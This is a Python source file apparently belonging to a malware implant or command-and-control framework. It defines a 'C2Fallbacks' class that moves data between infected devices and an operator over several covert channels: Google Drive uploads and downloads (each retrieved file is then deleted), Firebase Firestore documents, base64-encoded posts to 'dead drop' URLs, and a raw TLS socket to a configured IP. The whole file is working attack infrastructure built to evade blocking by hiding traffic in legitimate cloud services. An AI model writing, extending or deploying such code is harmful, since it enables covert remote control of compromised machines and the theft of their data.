import os
import json
import time
import base64
import logging
import socket
import ssl
from typing import Optional, Dict, Any, List

import requests
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseUpload, MediaIoBaseDownload
import io
import firebase_admin
from firebase_admin import credentials, firestore

logger = logging.getLogger(__name__)

class C2Fallbacks:
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.google_drive_service = None
        self.folder_id = None
        self.firebase_app = None
        self.firestore_client = None
        self.dead_drop_urls = self.config.get("dead_drop_urls", [])
        self._init_google_drive()
        self._init_firebase()

    def _init_google_drive(self):
        try:
            creds_json = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS_JSON")
            if creds_json:
                creds_info = json.loads(creds_json)
                creds = service_account.Credentials.from_service_account_info(creds_info)
                self.google_drive_service = build('drive', 'v3', credentials=creds)
                self.folder_id = os.environ.get("GOOGLE_DRIVE_FOLDER_ID")
                logger.info("Google Drive fallback initialized with service account")
            else:
                client_id = os.environ.get("GOOGLE_DRIVE_CLIENT_ID")
                client_secret = os.environ.get("GOOGLE_DRIVE_CLIENT_SECRET")
                refresh_token = os.environ.get("GOOGLE_DRIVE_REFRESH_TOKEN")
                if client_id and client_secret and refresh_token:
                    from google.oauth2.credentials import Credentials
                    creds = Credentials(
                        None,
                        refresh_token=refresh_token,
                        token_uri="https://oauth2.googleapis.com/token",
                        client_id=client_id,
                        client_secret=client_secret
                    )
                    self.google_drive_service = build('drive', 'v3', credentials=creds)
                    self.folder_id = os.environ.get("GOOGLE_DRIVE_FOLDER_ID")
                    logger.info("Google Drive fallback initialized with OAuth")
        except Exception as e:
            logger.error(f"Google Drive init failed: {e}")

    def _init_firebase(self):
        firebase_config = {
            "apiKey": os.environ.get("FIREBASE_API_KEY"),
            "authDomain": os.environ.get("FIREBASE_AUTH_DOMAIN"),
            "databaseURL": os.environ.get("FIREBASE_DATABASE_URL"),
            "projectId": os.environ.get("FIREBASE_PROJECT_ID"),
            "storageBucket": os.environ.get("FIREBASE_STORAGE_BUCKET"),
            "messagingSenderId": os.environ.get("FIREBASE_MESSAGING_SENDER_ID"),
            "appId": os.environ.get("FIREBASE_APP_ID")
        }
        if not all(firebase_config.values()):
            logger.warning("Firebase credentials missing")
            return
        try:
            cred = credentials.Certificate(firebase_config)
            self.firebase_app = firebase_admin.initialize_app(cred, {
                "databaseURL": firebase_config["databaseURL"]
            })
            self.firestore_client = firestore.client()
            logger.info("Firebase fallback initialized")
        except Exception as e:
            logger.error(f"Firebase init failed: {e}")

    def send_via_google_drive(self, device_id: str, data: bytes, filename: str = None) -> Optional[str]:
        if not self.google_drive_service or not self.folder_id:
            return None
        try:
            if not filename:
                filename = f"{device_id}_{int(time.time())}.bin"
            file_metadata = {'name': filename, 'parents': [self.folder_id]}
            media = MediaIoBaseUpload(io.BytesIO(data), mimetype='application/octet-stream')
            file = self.google_drive_service.files().create(
                body=file_metadata, media_body=media, fields='id'
            ).execute()
            file_id = file.get('id')
            logger.info(f"Sent via Google Drive: {file_id}")
            return file_id
        except Exception as e:
            logger.error(f"Google Drive send failed: {e}")
            return None

    def receive_via_google_drive(self, device_id: str) -> Optional[bytes]:
        if not self.google_drive_service or not self.folder_id:
            return None
        try:
            results = self.google_drive_service.files().list(
                q=f"name contains '{device_id}' and '{self.folder_id}' in parents",
                fields="files(id, name)"
            ).execute()
            files = results.get('files', [])
            if not files:
                return None
            file_id = files[0]['id']
            request = self.google_drive_service.files().get_media(fileId=file_id)
            fh = io.BytesIO()
            downloader = MediaIoBaseDownload(fh, request)
            done = False
            while not done:
                _, done = downloader.next_chunk()
            content = fh.getvalue()
            self.google_drive_service.files().delete(fileId=file_id).execute()
            logger.info(f"Received and deleted {file_id}")
            return content
        except Exception as e:
            logger.error(f"Google Drive receive failed: {e}")
            return None

    def send_via_firebase(self, device_id: str, data: Dict) -> bool:
        if not self.firestore_client:
            return False
        try:
            ref = self.firestore_client.collection("c2_fallbacks").document(device_id)
            ref.set({
                "data": data,
                "timestamp": firestore.SERVER_TIMESTAMP
            })
            logger.info(f"Sent via Firebase: {device_id}")
            return True
        except Exception as e:
            logger.error(f"Firebase send failed: {e}")
            return False

    def receive_via_firebase(self, device_id: str) -> Optional[Dict]:
        if not self.firestore_client:
            return None
        try:
            ref = self.firestore_client.collection("c2_fallbacks").document(device_id)
            doc = ref.get()
            if doc.exists:
                return doc.to_dict()
            return None
        except Exception as e:
            logger.error(f"Firebase receive failed: {e}")
            return None

    def send_via_dead_drop(self, device_id: str, data: bytes) -> bool:
        if not self.dead_drop_urls:
            return False
        for url in self.dead_drop_urls:
            try:
                encoded = base64.b64encode(data).decode()
                payload = {"device": device_id, "data": encoded, "ts": time.time()}
                resp = requests.post(url, json=payload, timeout=10)
                if resp.status_code in (200, 201):
                    logger.info(f"Sent via dead drop: {url}")
                    return True
            except Exception as e:
                logger.warning(f"Dead drop {url} failed: {e}")
        return False

    def receive_via_dead_drop(self, device_id: str) -> Optional[bytes]:
        if not self.dead_drop_urls:
            return None
        for url in self.dead_drop_urls:
            try:
                fetch_url = f"{url.rstrip('/')}/{device_id}.json"
                resp = requests.get(fetch_url, timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    if isinstance(data, dict) and "data" in data:
                        return base64.b64decode(data["data"])
            except Exception as e:
                logger.warning(f"Dead drop fetch from {url} failed: {e}")
        return None

    def establish_socket_fallback(self, target_ip: str, target_port: int, use_ssl: bool = True) -> Optional[socket.socket]:
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if use_ssl:
                context = ssl.create_default_context()
                sock = context.wrap_socket(raw_sock, server_hostname=target_ip)
            else:
                sock = raw_sock
            sock.connect((target_ip, target_port))
            logger.info(f"Socket fallback connected to {target_ip}:{target_port}")
            return sock
        except Exception as e:
            logger.error(f"Socket fallback failed: {e}")
            return None

    def send_via_socket(self, device_id: str, data: bytes, target_ip: str = None, target_port: int = 12345, use_ssl: bool = True) -> bool:
        ip = target_ip or self.config.get("fallback_ip")
        port = target_port or self.config.get("fallback_port", 12345)
        if not ip:
            logger.error("No fallback IP configured")
            return False
        sock = self.establish_socket_fallback(ip, port, use_ssl)
        if not sock:
            return False
        try:
            sock.send(data)
            logger.info(f"Sent {len(data)} bytes via socket fallback to {ip}:{port}")
            return True
        except Exception as e:
            logger.error(f"Socket send failed: {e}")
            return False
        finally:
            sock.close()

    def send(self, device_id: str, data: Any, channel: str = "auto") -> bool:
        if isinstance(data, (dict, list)):
            data_bytes = json.dumps(data).encode()
        elif isinstance(data, str):
            data_bytes = data.encode()
        else:
            data_bytes = data

        if channel == "google_drive":
            return self.send_via_google_drive(device_id, data_bytes) is not None
        elif channel == "firebase":
            return self.send_via_firebase(device_id, {"payload": base64.b64encode(data_bytes).decode()})
        elif channel == "dead_drop":
            return self.send_via_dead_drop(device_id, data_bytes)
        elif channel == "socket":
            return self.send_via_socket(device_id, data_bytes)
        else:
            results = []
            if self.google_drive_service:
                results.append(self.send_via_google_drive(device_id, data_bytes) is not None)
            if self.firestore_client:
                results.append(self.send_via_firebase(device_id, {"payload": base64.b64encode(data_bytes).decode()}))
            if self.dead_drop_urls:
                results.append(self.send_via_dead_drop(device_id, data_bytes))
            results.append(self.send_via_socket(device_id, data_bytes))
            return any(results)

    def receive(self, device_id: str, channel: str = "auto") -> Optional[Any]:
        if channel == "google_drive":
            return self.receive_via_google_drive(device_id)
        elif channel == "firebase":
            data = self.receive_via_firebase(device_id)
            if data and "payload" in data:
                return base64.b64decode(data["payload"])
        elif channel == "dead_drop":
            return self.receive_via_dead_drop(device_id)
        elif channel == "socket":
            # Socket receive is not implemented as a pull method; it's for outgoing only.
            return None
        else:
            if self.google_drive_service:
                data = self.receive_via_google_drive(device_id)
                if data:
                    return data
            if self.firestore_client:
                data = self.receive_via_firebase(device_id)
                if data and "payload" in data:
                    return base64.b64decode(data["payload"])
            if self.dead_drop_urls:
                data = self.receive_via_dead_drop(device_id)
                if data:
                    return data
        return None

    def status(self) -> Dict[str, bool]:
        return {
            "google_drive": self.google_drive_service is not None,
            "firebase": self.firestore_client is not None,
            "dead_drop": len(self.dead_drop_urls) > 0,
            "socket": True  # socket fallback is always available if IP configured
        }